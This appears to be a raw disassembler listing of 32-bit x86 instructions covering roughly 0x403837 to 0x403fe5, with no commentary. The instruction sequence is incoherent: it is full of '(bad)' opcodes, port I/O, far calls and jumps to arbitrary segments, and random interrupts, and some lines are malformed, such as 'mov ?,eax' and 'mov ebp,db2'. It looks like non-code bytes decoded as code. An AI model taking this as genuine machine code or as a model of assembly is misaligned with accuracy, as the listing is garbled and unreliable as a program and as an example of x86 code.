  403837:	ficomp DWORD PTR [edi+0x202497f1]
  40383d:	dec    ecx
  40383e:	data16 shl BYTE PTR [edx],0x9a
  403842:	push   edi
  403843:	sub    ah,BYTE PTR [ebp+0x3f]
  403846:	imul   ecx,DWORD PTR [ebx],0x7b605c8c
  40384c:	add    BYTE PTR [eax+0x4f15affb],cl
  403852:	js     0x403856
  403854:	xor    ebx,ebp
  403856:	jge    0x4038ba
  403858:	out    dx,eax
  403859:	jle    0x403801
  40385b:	gs ret 
  40385d:	ja     0x40389c
  40385f:	stos   BYTE PTR es:[edi],al
  403860:	jnp    0x403864
  403862:	out    0x4b,al
  403864:	adc    DWORD PTR [ebp+0x7],ecx
  403867:	dec    edx
  403868:	cmp    al,0x27
  40386a:	sbb    al,0xd2
  40386c:	sub    edi,edi
  40386e:	or     BYTE PTR ds:[si-0x509b],cl
  403874:	retf   0xcb18
  403877:	call   0xead3:0x58fe7951
  40387e:	out    dx,eax
  40387f:	loop   0x403872
  403881:	lods   al,BYTE PTR ds:[esi]
  403882:	fs ja  0x4038f5
  403885:	inc    edx
  403886:	mov    esi,0xd42e2c09
  40388b:	outs   dx,DWORD PTR ds:[esi]
  40388c:	cwde   
  40388d:	push   edi
  40388e:	das    
  40388f:	xchg   edi,eax
  403890:	inc    ebp
  403891:	js     0x4038ef
  403893:	scas   al,BYTE PTR es:[edi]
  403894:	inc    esi
  403895:	stc    
  403896:	xchg   esp,eax
  403897:	sti    
  403898:	fist   DWORD PTR [edx+0x5037b071]
  40389e:	shl    BYTE PTR [edi],0xe3
  4038a1:	inc    ebp
  4038a2:	sub    al,0xd4
  4038a4:	pop    ds
  4038a5:	inc    ebp
  4038a6:	test   al,0x20
  4038a8:	in     eax,0x5c
  4038aa:	pop    edi
  4038ab:	and    cl,dl
  4038ad:	test   esp,edi
  4038af:	lds    ecx,FWORD PTR [edi]
  4038b1:	dec    esi
  4038b2:	ret    0xc412
  4038b5:	jns    0x403921
  4038b7:	aas    
  4038b8:	xchg   al,ah
  4038ba:	ret    
  4038bb:	dec    edx
  4038bc:	xchg   esi,eax
  4038bd:	adc    dh,bl
  4038bf:	aad    0x8a
  4038c1:	add    al,0x8
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0xc2d405f3
  4038d5:	inc    edi
  4038d6:	add    ch,BYTE PTR [esp+edx*1+0x1d]
  4038da:	js     0x403954
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x40386f
  4038e1:	jle    0x403951
  4038e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038e4:	sub    eax,0xaea0b78e
  4038e9:	cwde   
  4038ea:	xchg   esi,eax
  4038eb:	add    ecx,esi
  4038ed:	push   eax
  4038ee:	pop    ds
  4038ef:	fldpi  
  4038f1:	sti    
  4038f2:	pushf  
  4038f3:	call   0x75cba65
  4038f8:	jbe    0x4038d9
  4038fa:	aas    
  4038fb:	in     eax,dx
  4038fc:	cmp    DWORD PTR [edi-0x32],eax
  4038ff:	in     eax,dx
  403900:	loopne 0x403882
  403902:	mov    BYTE PTR [eax-0x2f77fc88],cl
  403908:	sbb    ecx,DWORD PTR [esi-0x1ee371dd]
  40390e:	sbb    al,BYTE PTR [eax+0x1a2cf369]
  403914:	in     eax,dx
  403915:	test   BYTE PTR [ebx-0x28168577],0xcc
  40391c:	inc    esp
  40391d:	setne  BYTE PTR [edx+0x3a3b3dff]
  403924:	popf   
  403925:	outs   dx,DWORD PTR fs:[esi]
  403927:	fstp   TBYTE PTR [edx]
  403929:	imul   esp,DWORD PTR [ebx-0x5d3a8c1b],0xc4b46d68
  403933:	jns    0x4038d7
  403935:	xlat   BYTE PTR ds:[ebx]
  403936:	iret   
  403937:	jmp    0x2c37:0xbe5863b3
  40393e:	and    BYTE PTR [edx],dl
  403940:	imul   ecx,DWORD PTR [ebx-0x1d],0x35
  403944:	out    0x94,al
  403946:	sahf   
  403947:	test   dl,dl
  403949:	repnz push eax
  40394b:	push   esi
  40394c:	cs sub al,0x2c
  40394f:	jnp    0x40392b
  403951:	add    eax,0x8390ab2
  403956:	inc    esi
  403957:	or     dl,BYTE PTR es:[ebx]
  40395a:	xchg   edx,eax
  40395b:	dec    ebx
  40395c:	call   0x61fd85ac
  403961:	sbb    al,0x1e
  403963:	cmp    al,0x9b
  403965:	out    0x77,eax
  403967:	test   BYTE PTR [ebx-0x79],bh
  40396a:	and    bh,BYTE PTR [ecx-0x38cee9be]
  403970:	xor    bl,BYTE PTR [ebp+esi*4+0x11cd5e20]
  403977:	mov    al,ds:0x93e7442
  40397c:	and    eax,esp
  40397e:	and    esi,DWORD PTR [esi+0x7be360c9]
  403984:	inc    esi
  403985:	adc    ecx,ebp
  403987:	or     al,0xb
  403989:	or     eax,DWORD PTR [ebx-0x71838746]
  40398f:	pop    ebx
  403990:	add    eax,0xddfd21af
  403995:	dec    edx
  403996:	jno    0x403961
  403998:	jecxz  0x403933
  40399a:	sub    edi,0x5fc5efa2
  4039a0:	inc    ecx
  4039a1:	fldenv [edx-0xe]
  4039a4:	(bad)  
  4039a5:	enter  0x9a4,0xbb
  4039a9:	out    dx,al
  4039aa:	test   BYTE PTR [eax],dl
  4039ac:	jae    0x4039cd
  4039ae:	into   
  4039af:	push   ds
  4039b0:	fs out dx,eax
  4039b2:	jl     0x40394c
  4039b4:	and    esi,edx
  4039b6:	sbb    DWORD PTR [ebx],eax
  4039b8:	mov    dh,0x20
  4039ba:	rol    BYTE PTR [esi+0x79913cb6],cl
  4039c0:	mov    ebx,0x603948f9
  4039c5:	pop    esp
  4039c6:	gs ret 0xefe9
  4039ca:	lods   eax,DWORD PTR ds:[esi]
  4039cb:	es and eax,0xb9644b9
  4039d1:	std    
  4039d2:	shld   DWORD PTR [ecx+ecx*4],edx,0x40
  4039d7:	imul   ebp,DWORD PTR [ebx+ecx*2],0x28
  4039db:	jb     0x403a49
  4039dd:	cwde   
  4039de:	cmp    DWORD PTR [esi-0x7b],ebp
  4039e1:	mov    ?,eax
  4039e3:	shl    BYTE PTR [edx+edx*4-0x450d9977],cl
  4039ea:	add    eax,0xc9affae5
  4039ef:	mov    al,0x25
  4039f1:	repz jp 0x403a66
  4039f4:	adc    bl,BYTE PTR [edi-0x6ebb52c2]
  4039fa:	fisubr WORD PTR [edx+0x5d]
  4039fd:	mov    ebp,db2
  403a00:	stos   DWORD PTR es:[edi],eax
  403a01:	nop
  403a02:	out    0xf8,eax
  403a04:	sbb    ch,BYTE PTR [ebx]
  403a06:	mov    dl,0x71
  403a08:	mov    cl,0x97
  403a0a:	pop    ss
  403a0b:	iret   
  403a0c:	adc    eax,0xa051e0d6
  403a11:	mov    ecx,0xf457123c
  403a16:	xor    BYTE PTR [ebx-0x6fcca9f9],bh
  403a1c:	push   edx
  403a1d:	scas   al,BYTE PTR es:[edi]
  403a1e:	sbb    al,0x7d
  403a20:	sti    
  403a21:	xchg   ebp,eax
  403a22:	dec    esi
  403a23:	dec    esi
  403a24:	jo     0x403a8e
  403a26:	arpl   sp,bx
  403a28:	push   esp
  403a29:	cmp    esi,DWORD PTR [edx]
  403a2b:	shr    BYTE PTR [edi],0x2e
  403a2e:	add    BYTE PTR [esp+eiz*8+0x939f09e],ah
  403a35:	dec    esi
  403a36:	inc    edx
  403a37:	mov    dl,0x52
  403a39:	mov    edi,0x19fc9e15
  403a3e:	or     BYTE PTR [ebx+0x16],al
  403a41:	sbb    BYTE PTR [eax+0x0],0xd7
  403a45:	je     0x403a72
  403a47:	adc    eax,DWORD PTR [edx-0x28]
  403a4a:	call   0x1184e9d6
  403a4f:	inc    edx
  403a50:	cdq    
  403a51:	mov    DWORD PTR [ebx],esp
  403a53:	pusha  
  403a54:	inc    eax
  403a55:	add    cl,BYTE PTR [edx-0x72]
  403a58:	stc    
  403a59:	dec    edi
  403a5a:	or     DWORD PTR [edx],esi
  403a5c:	fcom   DWORD PTR ss:[eax+0x9]
  403a60:	out    0x4e,eax
  403a62:	pop    ecx
  403a63:	bound  edi,QWORD PTR [edi+ebx*2-0x7c]
  403a67:	mov    eax,0xee9c2f5c
  403a6c:	cmp    eax,0x3cfa58f6
  403a71:	stos   DWORD PTR es:[edi],eax
  403a72:	lahf   
  403a73:	daa    
  403a74:	div    bl
  403a76:	xor    bh,BYTE PTR [eax]
  403a78:	scas   al,BYTE PTR es:[edi]
  403a79:	mov    edi,0x4e86c6d7
  403a7e:	cld    
  403a7f:	inc    esi
  403a80:	mov    bl,0xd1
  403a82:	mov    edx,0x9981b06
  403a87:	(bad)  
  403a88:	int    0xfd
  403a8a:	cli    
  403a8b:	xchg   edi,eax
  403a8d:	int    0x3a
  403a8f:	pop    es
  403a90:	adc    DWORD PTR [ebp-0x22],eax
  403a93:	push   0x44ec4d3c
  403a98:	stc    
  403a99:	pop    esp
  403a9a:	mov    BYTE PTR [edi+0x45],al
  403a9d:	clc    
  403a9e:	dec    esp
  403a9f:	fisubr DWORD PTR [ecx-0x5d]
  403aa2:	inc    edi
  403aa3:	dec    sp
  403aa5:	push   es
  403aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa7:	sahf   
  403aa8:	(bad)  
  403aaa:	push   edi
  403aab:	xchg   DWORD PTR ds:0x81d51bb1,ecx
  403ab1:	in     al,dx
  403ab2:	cs cdq 
  403ab4:	loope  0x403a75
  403ab6:	js     0x403acb
  403ab8:	push   ebp
  403ab9:	fcom   QWORD PTR [ecx+0x9]
  403abc:	pop    edi
  403abd:	mov    bh,0xbc
  403abf:	lock adc ebx,DWORD PTR [ebx+0x62]
  403ac3:	push   edi
  403ac4:	sub    ch,BYTE PTR [edx-0x1df0312d]
  403aca:	jbe    0x403afc
  403acc:	clc    
  403acd:	cmc    
  403ace:	cmp    DWORD PTR [esi+0x44],edi
  403ad1:	hlt    
  403ad2:	inc    edi
  403ad3:	jle    0x403acb
  403ad5:	xchg   ebp,eax
  403ad6:	xor    esp,DWORD PTR [edi+0x3b]
  403ad9:	loopne 0x403ac6
  403adb:	scas   al,BYTE PTR es:[edi]
  403adc:	inc    edi
  403add:	inc    eax
  403ade:	xchg   esp,eax
  403adf:	push   edi
  403ae0:	bt     edx,esi
  403ae3:	in     eax,dx
  403ae4:	dec    edi
  403ae5:	(bad)  
  403ae6:	xor    ch,BYTE PTR [edx-0x38e70903]
  403aec:	adc    al,0x2c
  403aee:	xchg   edi,eax
  403aef:	push   ds
  403af0:	div    edx
  403af2:	adc    edi,DWORD PTR [ecx]
  403af4:	cmp    eax,0x45b3ca01
  403af9:	mov    al,0x47
  403afb:	in     al,0x82
  403afd:	enter  0xbcb6,0x2f
  403b01:	cmp    DWORD PTR [ebp+0x46],edx
  403b04:	inc    esi
  403b05:	xchg   DWORD PTR [ecx+edx*4+0x54],edx
  403b09:	cmp    DWORD PTR [ecx],ecx
  403b0b:	cmp    edi,esp
  403b0d:	mov    al,0x9
  403b0f:	mov    ebx,0xb93d6180
  403b14:	mov    eax,0x33f9d00a
  403b19:	fisub  WORD PTR [edi+0x5d1091f5]
  403b1f:	mov    cl,BYTE PTR [esi-0x6fcda55b]
  403b25:	nop
  403b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b27:	push   ebp
  403b28:	or     bl,al
  403b2a:	pop    eax
  403b2b:	jle    0x403b34
  403b2d:	mov    ah,0xe8
  403b2f:	scas   eax,DWORD PTR es:[edi]
  403b30:	sub    DWORD PTR [eax-0x1a],edx
  403b33:	push   esp
  403b34:	xchg   esi,eax
  403b35:	cmp    eax,0x788c0547
  403b3a:	rol    DWORD PTR [esi-0x7c],0x93
  403b3e:	call   0xf3aa:0xd16d3582
  403b45:	and    DWORD PTR [edx+ecx*2],ecx
  403b48:	test   BYTE PTR [eax],0x60
  403b4b:	std    
  403b4c:	sar    ah,1
  403b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b50:	cmp    eax,0x39dfce05
  403b55:	leave  
  403b56:	jge    0x403bd0
  403b58:	retf   
  403b59:	jmp    0x403afc
  403b5b:	inc    esp
  403b5c:	jns    0x403ba8
  403b5e:	xchg   edx,eax
  403b5f:	pop    eax
  403b60:	ror    DWORD PTR [edi+0x4],1
  403b63:	cmp    esi,DWORD PTR [ebx+eax*2]
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	les    ecx,FWORD PTR [eax+eax*4+0x78239a42]
  403b86:	js     0x403b86
  403b88:	jle    0x403c02
  403b8a:	js     0x403bca
  403b8c:	inc    eax
  403b8d:	lock dec ecx
  403b8f:	sub    bl,BYTE PTR [ecx-0x7c]
  403b92:	sbb    DWORD PTR [esi-0x595251f0],edx
  403b98:	sbb    BYTE PTR [ecx+0x45],dl
  403b9b:	rcl    BYTE PTR ds:0xde5c3330,cl
  403ba1:	imul   edx,DWORD PTR [ebx+0x47ee279],0xa
  403ba8:	rcr    cl,1
  403baa:	and    eax,0x28f87070
  403baf:	mov    ebp,0xc4402291
  403bb4:	and    bl,BYTE PTR ds:0xd2eecf89
  403bba:	imul   esi,DWORD PTR [ebp+0x78a13b2],0x3267ee20
  403bc4:	adc    BYTE PTR [ebx],ah
  403bc6:	(bad)  
  403bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc8:	xor    bh,BYTE PTR [ebx+0x13]
  403bcb:	mov    bh,0x47
  403bcd:	test   eax,0x619ba8c5
  403bd2:	inc    ebx
  403bd3:	adc    eax,0x6c5786fb
  403bd8:	jg     0x403b80
  403bda:	mov    ch,0x98
  403bdc:	pop    edi
  403bdd:	push   es
  403bde:	dec    ebx
  403bdf:	rcl    BYTE PTR [ebp+0x28ab443e],1
  403be5:	(bad)  
  403be6:	icebp  
  403be7:	icebp  
  403be8:	mul    BYTE PTR [edx-0x7c]
  403beb:	lahf   
  403bec:	xchg   esp,eax
  403bed:	call   0x60a1:0xa0085620
  403bf4:	mov    bh,0x56
  403bf6:	out    0x7,al
  403bf8:	loop   0x403b83
  403bfa:	xchg   ebx,eax
  403bfb:	cmp    esp,edi
  403bfd:	push   edi
  403bfe:	popa   
  403bff:	add    DWORD PTR [edi-0x9],0xe48d439e
  403c06:	fwait
  403c07:	stos   DWORD PTR es:[edi],eax
  403c08:	pop    esp
  403c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c0a:	ds jge 0x403c59
  403c0d:	xor    DWORD PTR [ebx],edi
  403c0f:	mov    fs,WORD PTR [edi+0x1d788ff0]
  403c15:	enter  0xb0f5,0x90
  403c19:	cld    
  403c1a:	clc    
  403c1b:	push   ds
  403c1c:	inc    edx
  403c1d:	outs   dx,BYTE PTR ds:[esi]
  403c1e:	ds aad 0x25
  403c21:	imul   ebp,DWORD PTR [ecx+0x69],0xe1d428ff
  403c28:	or     eax,0x80a21630
  403c2d:	mov    dh,0x67
  403c2f:	push   es
  403c30:	xchg   BYTE PTR [edi-0xc],bl
  403c33:	shl    DWORD PTR [ecx-0x4100f77b],0x16
  403c3a:	in     eax,0x13
  403c3c:	test   DWORD PTR [edx],esp
  403c3e:	cwd    
  403c40:	in     al,dx
  403c41:	sbb    eax,0xe508f5f3
  403c46:	or     ah,bl
  403c48:	push   edx
  403c49:	loope  0x403c84
  403c4b:	es mov esi,0x919eeebe
  403c51:	dec    edx
  403c52:	ror    DWORD PTR [ecx-0x1a329204],cl
  403c58:	jnp    0x403c85
  403c5a:	push   edi
  403c5b:	shl    BYTE PTR [ecx+0x7c0c895b],0x2e
  403c62:	push   0x10
  403c64:	mov    al,0x29
  403c66:	dec    eax
  403c67:	cmp    BYTE PTR [ebx-0x5c],ah
  403c6a:	adc    eax,0x580d1f5d
  403c6f:	in     al,dx
  403c70:	xlat   BYTE PTR ds:[ebx]
  403c71:	xchg   ebx,eax
  403c72:	jge    0x403c3e
  403c74:	loopne 0x403c35
  403c76:	pop    ebp
  403c77:	jb     0x403cb5
  403c79:	jge    0x403cf5
  403c7b:	popa   
  403c7c:	push   cs
  403c7d:	clc    
  403c7e:	test   DWORD PTR [ecx-0x884a63c],esi
  403c84:	push   0x4d886021
  403c89:	iret   
  403c8a:	push   cs
  403c8b:	std    
  403c8c:	jo     0x403c8c
  403c8e:	adc    DWORD PTR ds:0xafe274ce,0xb7129946
  403c98:	mov    cl,dl
  403c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c9b:	sub    BYTE PTR [ecx],ah
  403c9d:	mov    ebx,DWORD PTR [eax+eax*8+0x34]
  403ca1:	xor    al,0x5e
  403ca3:	ror    DWORD PTR [ebx],cl
  403ca5:	pop    eax
  403ca6:	loop   0x403cb7
  403ca8:	or     ecx,DWORD PTR [ebx+0x14ad6fa8]
  403cae:	ds push ecx
  403cb0:	mov    al,0x9b
  403cb2:	xchg   edx,eax
  403cb3:	jnp    0x403c97
  403cb5:	xchg   esi,eax
  403cb6:	fs in  al,dx
  403cb8:	out    dx,al
  403cb9:	cmc    
  403cba:	neg    BYTE PTR [eax-0x1a]
  403cbd:	sbb    al,0x3c
  403cbf:	cmp    edi,DWORD PTR [edx+edi*8]
  403cc2:	xchg   DWORD PTR [ebp+ecx*8+0x30],esi
  403cc6:	push   cs
  403cc7:	dec    edx
  403cc8:	jne    0x403cba
  403cca:	stos   DWORD PTR es:[edi],eax
  403ccb:	mov    WORD PTR [eax+0xe787fc],ds
  403cd1:	push   ebx
  403cd2:	iret   
  403cd3:	cmp    DWORD PTR [edi],ebx
  403cd5:	or     al,0x47
  403cd7:	test   DWORD PTR [edi-0x17cad0b6],edi
  403cdd:	and    eax,0xc04b9bcc
  403ce2:	aaa    
  403ce3:	jb     0x403c67
  403ce5:	ror    BYTE PTR [edx],1
  403ce7:	inc    bp
  403ce9:	je     0x403d02
  403ceb:	pusha  
  403cec:	pop    ss
  403ced:	or     DWORD PTR [edi+edx*1],eax
  403cf0:	dec    esi
  403cf1:	daa    
  403cf2:	sti    
  403cf3:	jo     0x403d2d
  403cf5:	and    edi,ebx
  403cf7:	stc    
  403cf8:	fimul  WORD PTR [edi]
  403cfa:	push   edx
  403cfb:	push   ebp
  403cfc:	sub    DWORD PTR [ecx-0x7445a0be],eax
  403d02:	cmp    dh,BYTE PTR [ebx]
  403d04:	or     dh,BYTE PTR [di-0x4b42]
  403d09:	adc    al,0x1c
  403d0b:	test   eax,0x4933d473
  403d11:	dec    eax
  403d12:	scas   al,BYTE PTR es:[edi]
  403d13:	mov    dh,0x6a
  403d15:	mov    ebx,0x57000e62
  403d1a:	jle    0x403ca7
  403d1c:	aad    0x7e
  403d1e:	inc    eax
  403d1f:	std    
  403d20:	arpl   WORD PTR [eax-0x34407e88],bp
  403d26:	cmp    dh,al
  403d28:	add    eax,0x5bd31f0
  403d2d:	add    al,0xca
  403d2f:	push   0xffffffb5
  403d31:	aad    0x84
  403d33:	pop    ecx
  403d34:	in     eax,dx
  403d35:	enter  0x4d81,0xf8
  403d39:	and    DWORD PTR [edx-0x33],ecx
  403d3c:	int3   
  403d3d:	push   esi
  403d3e:	jmp    0x588d:0xed2b3bee
  403d45:	add    eax,0xe7b4d819
  403d4a:	sub    ebx,ebx
  403d4c:	sti    
  403d4d:	sti    
  403d4e:	fmul   DWORD PTR [esi]
  403d50:	or     eax,0xe0c63aeb
  403d55:	mov    ds:0xe669db31,eax
  403d5a:	out    0x20,al
  403d5c:	scas   eax,DWORD PTR es:[edi]
  403d5d:	push   edx
  403d5e:	inc    edx
  403d5f:	ret    
  403d60:	adc    BYTE PTR [esp+edx*4],cl
  403d63:	(bad)  
  403d64:	loope  0x403d21
  403d66:	loop   0x403ced
  403d68:	test   BYTE PTR [edi-0x6e6dba01],al
  403d6e:	lock adc eax,0x979ab5d7
  403d74:	out    dx,eax
  403d75:	ins    BYTE PTR es:[edi],dx
  403d76:	(bad)  
  403d78:	imul   eax,DWORD PTR [esi+0x36],0xee0061b6
  403d7f:	mov    dh,0xab
  403d81:	loope  0x403dc5
  403d83:	cmp    ah,BYTE PTR [edi]
  403d85:	xchg   esi,eax
  403d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d87:	xchg   esi,eax
  403d88:	and    eax,0x6b148619
  403d8d:	ret    0x6a10
  403d90:	out    0xae,al
  403d92:	loop   0x403d9b
  403d94:	xor    DWORD PTR [eax+ecx*8-0x68],0x35da2f21
  403d9c:	clc    
  403d9d:	in     ax,dx
  403d9f:	and    ah,BYTE PTR [edi]
  403da1:	jns    0x403e05
  403da3:	mov    ecx,0x50b395eb
  403da8:	(bad)  
  403da9:	push   ebp
  403daa:	inc    edx
  403dab:	push   esi
  403dac:	and    eax,0x41292e31
  403db1:	pushf  
  403db2:	hlt    
  403db3:	daa    
  403db4:	cmp    eax,DWORD PTR [ebp*8-0x794a042c]
  403dbb:	xor    ebp,DWORD PTR [edi]
  403dbd:	rol    DWORD PTR [edx+0x30ce730c],1
  403dc3:	add    DWORD PTR [edi+0x396c9a32],0x72
  403dca:	retf   0x3f84
  403dcd:	mov    bl,BYTE PTR [esi]
  403dcf:	out    0x58,eax
  403dd1:	mov    ebp,0xab65a299
  403dd6:	or     bh,BYTE PTR [ebx-0x9]
  403dd9:	cli    
  403dda:	sbb    al,0x52
  403ddc:	mov    esp,DWORD PTR [ebp-0x28cae890]
  403de2:	stc    
  403de3:	outs   dx,DWORD PTR ds:[esi]
  403de4:	add    BYTE PTR [ebx],0x89
  403de7:	sub    al,0xb9
  403de9:	fstp   QWORD PTR [edi+0x3d]
  403dec:	mov    dh,0xe
  403dee:	cwde   
  403def:	imul   edi,DWORD PTR [ebp-0x23798eb4],0xffffffb2
  403df6:	inc    ebp
  403df7:	icebp  
  403df8:	mov    ebx,esi
  403dfa:	sub    BYTE PTR [eax+0x39],dh
  403dfd:	dec    ecx
  403dfe:	mov    WORD PTR [ebx+0x48],fs
  403e01:	jg     0x403e55
  403e03:	cmp    esp,DWORD PTR [esi-0x18]
  403e06:	outs   dx,BYTE PTR ds:[esi]
  403e07:	pop    ebp
  403e08:	mov    BYTE PTR [esi-0x742b7fe3],al
  403e0e:	inc    ebp
  403e0f:	or     BYTE PTR [ebx-0x39cc07b3],cl
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0xcfdd8593
  403e30:	pop    ds
  403e31:	hlt    
  403e32:	in     eax,dx
  403e33:	sbb    BYTE PTR [eax],ah
  403e35:	js     0x403eaf
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403e69
  403e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e3d:	sbb    bl,dl
  403e3f:	mov    ch,0x78
  403e41:	dec    ebx
  403e42:	push   cs
  403e43:	pushf  
  403e44:	xchg   edx,eax
  403e45:	test   al,0xe9
  403e47:	imul   ebp,DWORD PTR [edx+edx*2-0x1bb60705],0xffffffc2
  403e4f:	pop    ebp
  403e50:	mov    bl,0x7a
  403e52:	mov    dh,BYTE PTR [ebp-0x31]
  403e55:	push   es
  403e56:	retf   
  403e57:	dec    esp
  403e58:	or     BYTE PTR [edx],ch
  403e5a:	inc    eax
  403e5b:	fdiv   QWORD PTR [edx+0x42]
  403e5e:	aam    0x13
  403e60:	popf   
  403e61:	cmp    eax,0x3deee03
  403e66:	hlt    
  403e67:	sbb    DWORD PTR [ecx-0x5e749835],0xc4d795cf
  403e71:	cmc    
  403e72:	mov    BYTE PTR [eax+0x40],dh
  403e75:	xlat   BYTE PTR ds:[ebx]
  403e76:	fwait
  403e77:	dec    ecx
  403e78:	jo     0x403ec9
  403e7a:	shl    BYTE PTR [esi],cl
  403e7c:	lods   al,BYTE PTR ds:[esi]
  403e7d:	pop    ss
  403e7e:	cld    
  403e7f:	pop    eax
  403e80:	mov    eax,0x8191fb39
  403e85:	(bad)  
  403e86:	in     al,dx
  403e87:	jecxz  0x403e39
  403e89:	imul   esp,DWORD PTR [ecx+esi*1-0x68],0x3
  403e8e:	xor    ch,BYTE PTR [ebx-0x693a2731]
  403e94:	jne    0x403e31
  403e96:	mov    dl,0xac
  403e98:	rcl    BYTE PTR [edx],1
  403e9a:	jle    0x403e69
  403e9c:	push   eax
  403e9d:	mov    ebx,DWORD PTR ds:0xa9d1ac42
  403ea3:	lds    esi,FWORD PTR [eax-0x39591de8]
  403ea9:	call   0x6b6c:0x62ae2de4
  403eb0:	xchg   edx,eax
  403eb1:	sahf   
  403eb2:	retf   0xd7af
  403eb5:	test   bh,0xf6
  403eb8:	fnstsw WORD PTR [esp+edi*4+0x75886755]
  403ebf:	(bad)  
  403ec0:	clc    
  403ec1:	push   edx
  403ec2:	or     DWORD PTR [esi-0xd],esp
  403ec5:	test   eax,0xb7d5b789
  403eca:	pop    eax
  403ecb:	push   0x3c
  403ecd:	dec    edx
  403ece:	pop    ebx
  403ecf:	fwait
  403ed0:	stc    
  403ed1:	mov    eax,ds:0xbc873ba
  403ed6:	mov    al,0xf8
  403ed8:	adc    edx,DWORD PTR [edx-0x32]
  403edb:	mov    ebx,0x48cc0678
  403ee1:	lea    esi,[edx+ebp*8+0x66f0580e]
  403ee8:	imul   esp,DWORD PTR [ebp-0x7f],0xffffffeb
  403eec:	(bad)  
  403eed:	out    dx,al
  403eee:	jo     0x403f54
  403ef0:	push   edi
  403ef1:	push   eax
  403ef2:	out    0xeb,eax
  403ef4:	int    0xc7
  403ef6:	cmp    DWORD PTR [ebp+0x4dfe6cc3],edi
  403efc:	ret    
  403efd:	pop    esi
  403efe:	pop    ss
  403eff:	aas    
  403f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f01:	cld    
  403f02:	and    BYTE PTR [ebx-0x2c],dl
  403f05:	out    dx,al
  403f06:	mov    eax,0x3b8e5c1d
  403f0b:	add    BYTE PTR [eax],dh
  403f0d:	xor    al,0x41
  403f0f:	pop    edi
  403f10:	(bad)  
  403f11:	in     al,dx
  403f12:	push   esp
  403f13:	aam    0xc3
  403f15:	sbb    eax,DWORD PTR [edi]
  403f17:	daa    
  403f18:	iret   
  403f19:	(bad)  
  403f1b:	icebp  
  403f1c:	xor    al,0xa4
  403f1e:	mov    WORD PTR [ecx+edi*8+0x3eab46a0],ds
  403f25:	or     DWORD PTR [esi+0x55f38a51],edi
  403f2b:	test   al,0x87
  403f2d:	inc    esp
  403f2e:	loop   0x403f67
  403f30:	cli    
  403f31:	loopne 0x403f3b
  403f33:	pop    ecx
  403f34:	pop    edx
  403f35:	es (bad) 
  403f37:	mov    edx,0xff166741
  403f3c:	icebp  
  403f3d:	neg    BYTE PTR [ecx]
  403f3f:	out    0x11,al
  403f41:	jle    0x403f81
  403f43:	push   0xffffff83
  403f45:	(bad)  [ebp+0x52217dd1]
  403f4b:	(bad)  
  403f4c:	mov    ebx,0x99f83f2d
  403f51:	out    dx,al
  403f52:	mov    bh,0xda
  403f54:	jo     0x403f31
  403f56:	mov    dh,0x9e
  403f58:	(bad)  
  403f59:	cmp    ebp,ecx
  403f5b:	fiadd  DWORD PTR [ebp+0x46fbe9de]
  403f61:	pushf  
  403f62:	int    0x44
  403f64:	shl    ebx,cl
  403f66:	pop    ebp
  403f67:	push   edi
  403f68:	(bad)  
  403f69:	mov    eax,ds:0x51225013
  403f6e:	jo     0x403ef7
  403f70:	mov    bh,bh
  403f72:	xchg   esi,eax
  403f73:	data16 ss add al,0x14
  403f77:	push   edx
  403f78:	or     edx,DWORD PTR [esi]
  403f7a:	jmp    0x403fb8
  403f7c:	arpl   si,si
  403f7e:	inc    ecx
  403f7f:	pusha  
  403f80:	mov    eax,ds:0x858857fb
  403f85:	dec    eax
  403f86:	lods   eax,DWORD PTR ds:[esi]
  403f87:	sub    esi,ebx
  403f89:	xchg   esi,eax
  403f8a:	pop    es
  403f8b:	sbb    dh,cl
  403f8d:	inc    edi
  403f8e:	adc    BYTE PTR [eax],bl
  403f90:	sub    eax,edi
  403f92:	and    DWORD PTR [ebx],ebp
  403f94:	sub    ch,BYTE PTR [edi]
  403f96:	and    ch,0x21
  403f99:	ja     0x403ff2
  403f9b:	or     ah,BYTE PTR [eax-0x56]
  403f9e:	pop    es
  403f9f:	sbb    DWORD PTR [edx+esi*4+0xe2ea9ca],edi
  403fa6:	jecxz  0x403f83
  403fa8:	adc    cl,BYTE PTR [esi-0x1]
  403fab:	inc    esi
  403fac:	sahf   
  403fad:	xor    DWORD PTR [esi],eax
  403faf:	fs add al,0x34
  403fb2:	sub    al,0x8e
  403fb4:	es mov bh,0xc3
  403fb7:	popf   
  403fb8:	push   ebx
  403fb9:	sbb    al,0x84
  403fbb:	sbb    BYTE PTR [edx-0x3b43d6f0],dl
  403fc1:	sub    al,0x51
  403fc3:	shl    BYTE PTR [edi],cl
  403fc5:	repnz xor ah,ah
  403fc8:	mov    ebp,0xcd1c58f2
  403fcd:	jb     0x403ff0
  403fcf:	pop    esi
  403fd0:	xor    bl,BYTE PTR [esi+0x4454f913]
  403fd6:	data16 loope 0x403fc7
  403fd9:	and    DWORD PTR [edx-0x80],ebp
  403fdc:	cli    
  403fdd:	pop    edx
  403fde:	arpl   WORD PTR [eax],sp
  403fe0:	add    dh,0xa3
  403fe3:	sub    al,0x2c
  403fe5:	cwde   
